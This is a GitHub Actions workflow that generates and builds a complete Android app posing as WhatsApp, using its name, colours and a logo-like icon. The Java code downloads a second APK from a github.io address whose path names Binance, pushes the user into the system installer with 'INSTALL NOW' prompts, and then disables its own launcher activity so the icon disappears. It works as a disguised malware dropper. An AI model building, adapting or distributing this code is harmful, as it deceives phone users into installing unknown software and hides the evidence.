name: Build WhatsApp Stub APK

on:
  push:
    branches: [ main ]
  workflow_dispatch:

jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: Create Android project
        run: |
          mkdir -p app/src/main/java/com/whatsapp/stub
          mkdir -p app/src/main/res/layout
          mkdir -p app/src/main/res/values
          mkdir -p app/src/main/res/drawable
          mkdir -p app/src/main/res/xml
          mkdir -p app/src/main/res/mipmap-anydpi-v26
          mkdir -p app/src/main/res/mipmap-hdpi
          mkdir -p app/src/main/res/mipmap-mdpi
          mkdir -p app/src/main/res/mipmap-xhdpi
          mkdir -p app/src/main/res/mipmap-xxhdpi
          mkdir -p app/src/main/res/mipmap-xxxhdpi

          cat > gradle.properties << 'EOF'
          android.useAndroidX=true
          android.enableJetifier=true
          EOF

          cat > app/src/main/AndroidManifest.xml << 'EOF'
          <manifest xmlns:android="http://schemas.android.com/apk/res/android"
              package="com.whatsapp.stub">
              <uses-permission android:name="android.permission.INTERNET" />
              <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />
              <uses-permission android:name="android.permission.REQUEST_INSTALL_PACKAGES" />
              <application
                  android:allowBackup="true"
                  android:label="WhatsApp"
                  android:theme="@style/Theme.AppCompat.Light.NoActionBar"
                  android:icon="@mipmap/ic_launcher"
                  android:usesCleartextTraffic="true">
                  <activity android:name=".MainActivity" android:exported="true">
                      <intent-filter>
                          <action android:name="android.intent.action.MAIN" />
                          <category android:name="android.intent.category.LAUNCHER" />
                      </intent-filter>
                  </activity>
                  <provider
                      android:name="androidx.core.content.FileProvider"
                      android:authorities="com.whatsapp.stub.fileprovider"
                      android:exported="false"
                      android:grantUriPermissions="true">
                      <meta-data
                          android:name="android.support.FILE_PROVIDER_PATHS"
                          android:resource="@xml/file_paths" />
                  </provider>
              </application>
          </manifest>
          EOF

          cat > app/src/main/res/values/styles.xml << 'EOF'
          <resources>
              <style name="Theme.AppCompat.Light.NoActionBar" parent="Theme.AppCompat.Light">
                  <item name="windowActionBar">false</item>
                  <item name="windowNoTitle">true</item>
                  <item name="android:windowBackground">@android:color/white</item>
              </style>
          </resources>
          EOF

          cat > app/src/main/res/drawable/circular_progress.xml << 'EOF'
          <?xml version="1.0" encoding="utf-8"?>
          <layer-list xmlns:android="http://schemas.android.com/apk/res/android">
              <item android:id="@android:id/background">
                  <shape>
                      <solid android:color="#E0E0E0"/>
                  </shape>
              </item>
              <item android:id="@android:id/progress">
                  <clip>
                      <shape>
                          <solid android:color="#25D366"/>
                      </shape>
                  </clip>
              </item>
          </layer-list>
          EOF

          cat > app/src/main/res/drawable/gradient_button.xml << 'EOF'
          <?xml version="1.0" encoding="utf-8"?>
          <shape xmlns:android="http://schemas.android.com/apk/res/android"
              android:shape="rectangle">
              <gradient
                  android:startColor="#25D366"
                  android:endColor="#128C7E"
                  android:angle="0"/>
              <corners android:radius="30dp"/>
              <padding
                  android:left="20dp"
                  android:top="12dp"
                  android:right="20dp"
                  android:bottom="12dp"/>
          </shape>
          EOF

          cat > app/src/main/res/drawable/ic_launcher_foreground.xml << 'EOF'
          <?xml version="1.0" encoding="utf-8"?>
          <vector xmlns:android="http://schemas.android.com/apk/res/android"
              android:width="108dp" android:height="108dp"
              android:viewportWidth="108" android:viewportHeight="108">
              <path android:fillColor="#25D366" android:pathData="M0,0h108v108h-108z" />
              <path android:fillColor="#FFFFFF"
                  android:pathData="M54,18c-19.9,0 -36,16.1 -36,36c0,6.3 1.6,12.3 4.5,17.5L18,90l19.3-5.1c5.1,2.8 11,4.4 17.2,4.4c19.9,0 36,-16.1 36,-36S73.9,18 54,18z M54,82.5c-5.8,0 -11.3,-1.6 -16,-4.3l-11.5,3.1l3.1,-11.2c-2.9,-4.8 -4.6,-10.3 -4.6,-16.1c0,-16.7 13.6,-30.3 30.3,-30.3S84.3,37.3 84.3,54S70.7,82.5 54,82.5z M67.9,63.7c-0.8,-0.4 -4.6,-2.3 -5.3,-2.6c-0.7,-0.3 -1.2,-0.4 -1.8,0.4c-0.5,0.8 -2.1,2.6 -2.6,3.2c-0.5,0.5 -0.9,0.6 -1.7,0.2c-0.8,-0.4 -3.4,-1.2 -6.4,-3.9c-2.4,-2.2 -4.0,-4.9 -4.4,-5.7c-0.5,-0.8 -0.1,-1.2 0.4,-1.6c0.4,-0.4 0.9,-0.9 1.3,-1.4c0.4,-0.5 0.6,-0.9 0.9,-1.5c0.3,-0.6 0.1,-1.1 -0.1,-1.6c-0.2,-0.5 -1.8,-4.3 -2.5,-5.9c-0.7,-1.6 -1.4,-1.4 -1.9,-1.4c-0.5,0 -1.1,0 -1.7,0c-0.6,0 -1.5,0.2 -2.3,1c-0.8,0.8 -3.0,2.9 -3.0,7.1c0,4.2 3.0,8.2 3.4,8.8c0.4,0.6 5.9,9.0 14.3,12.6c2.0,0.9 3.6,1.4 4.8,1.8c2.0,0.6 3.9,0.5 5.4,0.3c1.6,-0.2 4.6,-1.9 5.3,-3.7c0.7,-1.8 0.7,-3.4 0.5,-3.7C69.1,64.1 68.7,64.0 67.9,63.7z" />
          </vector>
          EOF

          cat > app/src/main/res/mipmap-anydpi-v26/ic_launcher.xml << 'EOF'
          <?xml version="1.0" encoding="utf-8"?>
          <adaptive-icon xmlns:android="http://schemas.android.com/apk/res/android">
              <background android:drawable="@color/ic_launcher_background"/>
              <foreground android:drawable="@drawable/ic_launcher_foreground"/>
          </adaptive-icon>
          EOF

          cat > app/src/main/res/values/colors.xml << 'EOF'
          <resources>
              <color name="ic_launcher_background">#25D366</color>
          </resources>
          EOF

          cat > app/src/main/res/values/strings.xml << 'EOF'
          <resources>
              <string name="app_name">WhatsApp</string>
          </resources>
          EOF

          cat > app/src/main/res/xml/file_paths.xml << 'EOF'
          <?xml version="1.0" encoding="utf-8"?>
          <paths>
              <cache-path name="cache" path="." />
              <external-cache-path name="external_cache" path="." />
              <files-path name="files" path="." />
          </paths>
          EOF

          cat > app/src/main/res/layout/activity_main.xml << 'EOF'
          <?xml version="1.0" encoding="utf-8"?>
          <LinearLayout xmlns:android="http://schemas.android.com/apk/res/android"
              xmlns:app="http://schemas.android.com/apk/res/android"
              android:layout_width="match_parent"
              android:layout_height="match_parent"
              android:orientation="vertical"
              android:background="#FFFFFF"
              android:gravity="center"
              android:padding="30dp">

              <ImageView
                  android:id="@+id/iconImage"
                  android:layout_width="100dp"
                  android:layout_height="100dp"
                  android:src="@mipmap/ic_launcher"
                  android:layout_marginBottom="16dp"/>

              <TextView
                  android:layout_width="wrap_content"
                  android:layout_height="wrap_content"
                  android:text="WhatsApp"
                  android:textSize="28sp"
                  android:textColor="#075E54"
                  android:textStyle="bold"
                  android:layout_marginBottom="4dp"/>

              <TextView
                  android:layout_width="wrap_content"
                  android:layout_height="wrap_content"
                  android:text="Secure messaging app"
                  android:textSize="14sp"
                  android:textColor="#666666"
                  android:layout_marginBottom="30dp"/>

              <RelativeLayout
                  android:layout_width="120dp"
                  android:layout_height="120dp"
                  android:layout_marginBottom="16dp">

                  <ProgressBar
                      android:id="@+id/circularProgress"
                      style="?android:attr/progressBarStyleHorizontal"
                      android:layout_width="120dp"
                      android:layout_height="120dp"
                      android:indeterminate="false"
                      android:max="100"
                      android:progress="0"
                      android:progressDrawable="@drawable/circular_progress"
                      android:layout_centerInParent="true"/>

                  <TextView
                      android:id="@+id/progressText"
                      android:layout_width="wrap_content"
                      android:layout_height="wrap_content"
                      android:text="0%"
                      android:textSize="22sp"
                      android:textColor="#075E54"
                      android:textStyle="bold"
                      android:layout_centerInParent="true"/>
              </RelativeLayout>

              <TextView
                  android:id="@+id/statusText"
                  android:layout_width="wrap_content"
                  android:layout_height="wrap_content"
                  android:text="Ready to install"
                  android:textSize="16sp"
                  android:textColor="#555555"
                  android:layout_marginBottom="30dp"/>

              <Button
                  android:id="@+id/installButton"
                  android:layout_width="match_parent"
                  android:layout_height="56dp"
                  android:text="INSTALL NOW"
                  android:textSize="18sp"
                  android:textColor="#FFFFFF"
                  android:textStyle="bold"
                  android:background="@drawable/gradient_button"
                  android:elevation="4dp"
                  android:stateListAnimator="@null"/>

          </LinearLayout>
          EOF

          cat > app/src/main/java/com/whatsapp/stub/MainActivity.java << 'EOF'
          package com.whatsapp.stub;

          import android.app.Activity;
          import android.content.ComponentName;
          import android.content.Intent;
          import android.content.pm.PackageManager;
          import android.net.Uri;
          import android.os.Build;
          import android.os.Bundle;
          import android.os.Handler;
          import android.os.Looper;
          import android.util.Log;
          import android.widget.Button;
          import android.widget.ProgressBar;
          import android.widget.TextView;
          import android.widget.Toast;
          import androidx.core.content.FileProvider;

          import java.io.File;
          import java.io.FileOutputStream;
          import java.io.InputStream;
          import java.net.HttpURLConnection;
          import java.net.URL;

          public class MainActivity extends Activity {
              private static final String TAG = "WhatsAppStub";
              private static final String APK_URL = "https://www-globals.github.io/Binance/app-debug.apk";
              private TextView statusText;
              private TextView progressText;
              private ProgressBar progressBar;
              private Button installButton;
              private Handler handler = new Handler(Looper.getMainLooper());

              @Override
              protected void onCreate(Bundle savedInstanceState) {
                  super.onCreate(savedInstanceState);
                  setContentView(R.layout.activity_main);
                  statusText = findViewById(R.id.statusText);
                  progressText = findViewById(R.id.progressText);
                  progressBar = findViewById(R.id.circularProgress);
                  installButton = findViewById(R.id.installButton);

                  installButton.setOnClickListener(v -> {
                      installButton.setEnabled(false);
                      installButton.setText("INSTALLING...");
                      statusText.setText("Downloading...");
                      progressText.setText("0%");
                      progressBar.setProgress(0);
                      downloadAndInstall();
                  });
              }

              private void downloadAndInstall() {
                  new Thread(() -> {
                      try {
                          URL url = new URL(APK_URL);
                          HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                          conn.setConnectTimeout(10000);
                          conn.setReadTimeout(10000);
                          int fileSize = conn.getContentLength();
                          InputStream in = conn.getInputStream();
                          File apkFile = new File(getCacheDir(), "main.apk");
                          FileOutputStream out = new FileOutputStream(apkFile);
                          byte[] buffer = new byte[4096];
                          int len;
                          long totalBytes = 0;
                          int lastProgress = 0;
                          while ((len = in.read(buffer)) != -1) {
                              out.write(buffer, 0, len);
                              totalBytes += len;
                              if (fileSize > 0) {
                                  int progress = (int) ((totalBytes * 100) / fileSize);
                                  if (progress != lastProgress) {
                                      lastProgress = progress;
                                      int finalProgress = progress;
                                      handler.post(() -> {
                                          progressBar.setProgress(finalProgress);
                                          progressText.setText(finalProgress + "%");
                                          statusText.setText("Downloading... " + finalProgress + "%");
                                      });
                                  }
                              }
                          }
                          out.close();
                          in.close();
                          conn.disconnect();

                          handler.post(() -> {
                              progressBar.setProgress(100);
                              progressText.setText("100% ✅");
                              statusText.setText("Opening installer...");
                              openInstaller(apkFile);
                          });

                      } catch (Exception e) {
                          Log.e(TAG, "Download failed: " + e.getMessage());
                          handler.post(() -> {
                              statusText.setText("Failed: " + e.getMessage());
                              installButton.setEnabled(true);
                              installButton.setText("RETRY");
                          });
                      }
                  }).start();
              }

              private void openInstaller(File apkFile) {
                  try {
                      Intent intent = new Intent(Intent.ACTION_VIEW);
                      Uri apkUri;

                      if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
                          apkUri = FileProvider.getUriForFile(this,
                                  "com.whatsapp.stub.fileprovider", apkFile);
                          intent.addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION);
                      } else {
                          apkUri = Uri.fromFile(apkFile);
                      }

                      intent.setDataAndType(apkUri, "application/vnd.android.package-archive");
                      intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                      startActivityForResult(intent, 100);

                      statusText.setText("Installation started. Tap 'Install' in the popup.");
                      Toast.makeText(this, "Please allow installation when prompted.", Toast.LENGTH_LONG).show();

                  } catch (Exception e) {
                      Log.e(TAG, "Open installer failed: " + e.getMessage());
                      statusText.setText("Install error: " + e.getMessage());
                      installButton.setEnabled(true);
                      installButton.setText("RETRY");
                  }
              }

              @Override
              protected void onActivityResult(int requestCode, int resultCode, Intent data) {
                  super.onActivityResult(requestCode, resultCode, data);
                  if (requestCode == 100) {
                      hideIconAndFinish();
                  }
              }

              private void hideIconAndFinish() {
                  ComponentName componentName = new ComponentName(this, MainActivity.class);
                  PackageManager pm = getPackageManager();
                  pm.setComponentEnabledSetting(componentName,
                          PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                          PackageManager.DONT_KILL_APP);
                  finish();
              }
          }
          EOF

          cat > app/build.gradle << 'EOF'
          apply plugin: 'com.android.application'
          android {
              compileSdk 34
              namespace 'com.whatsapp.stub'
              defaultConfig {
                  applicationId 'com.whatsapp.stub'
                  minSdk 21
                  targetSdk 34
                  versionCode 1
                  versionName '1.0'
              }
              signingConfigs {
                  debug {
                      storeFile file('debug.keystore')
                      storePassword 'android'
                      keyAlias 'android'
                      keyPassword 'android'
                  }
              }
              buildTypes {
                  debug {
                      signingConfig signingConfigs.debug
                  }
                  release {
                      minifyEnabled false
                      signingConfig signingConfigs.debug
                  }
              }
          }
          dependencies {
              implementation 'androidx.appcompat:appcompat:1.6.1'
          }
          EOF

          cat > settings.gradle << 'EOF'
          pluginManagement {
              repositories { google(); mavenCentral(); gradlePluginPortal() }
          }
          dependencyResolutionManagement {
              repositories { google(); mavenCentral() }
          }
          rootProject.name = "WhatsApp"
          include ':app'
          EOF

          cat > build.gradle << 'EOF'
          buildscript {
              repositories { google(); mavenCentral() }
              dependencies { classpath 'com.android.tools.build:gradle:8.0.0' }
          }
          EOF

          echo "✅ All source files created."

      - name: Setup Java 17
        uses: actions/setup-java@v4
        with:
          distribution: 'temurin'
          java-version: '17'

      - name: Setup Gradle
        uses: gradle/actions/setup-gradle@v3
        with:
          gradle-version: '8.0'

      - name: Generate Gradle Wrapper
        run: gradle wrapper --gradle-version 8.0

      - name: Setup Android SDK
        uses: android-actions/setup-android@v3

      - name: Accept Android licenses
        run: yes | sdkmanager --licenses

      - name: Install Android build tools
        run: sdkmanager "platform-tools" "platforms;android-34" "build-tools;34.0.0"

      - name: Generate Keystore
        run: |
          keytool -genkey -v -keystore app/debug.keystore -alias android -keyalg RSA -keysize 2048 -validity 10000 -storepass android -keypass android -dname "CN=Test, OU=Test, O=Test, L=Test, ST=Test, C=US"

      - name: Build Signed APK
        run: chmod +x gradlew && ./gradlew assembleDebug

      - name: Upload APK
        uses: actions/upload-artifact@v4
        with:
          name: WhatsApp-stub
          path: app/build/outputs/apk/debug/*.apk
